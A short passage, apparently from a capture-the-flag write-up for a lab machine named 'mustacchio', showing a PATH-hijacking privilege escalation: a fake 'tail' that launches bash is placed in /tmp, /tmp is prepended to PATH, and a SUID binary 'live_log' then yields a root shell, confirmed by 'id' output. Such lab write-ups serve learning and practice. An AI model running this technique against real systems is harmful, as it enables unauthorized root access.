- PATH variable manipulation gives root shell.

```bash
barry@mustacchio:/home/joe$ echo "/bin/bash" > /tmp/tail 
barry@mustacchio:/home/joe$ chmod +x /tmp/tail 
barry@mustacchio:/home/joe$ export PATH=/tmp:$PATH
barry@mustacchio:/home/joe$ ./live_log 
root@mustacchio:/home/joe# id
uid=0(root) gid=0(root) groups=0(root),1003(barry)
```

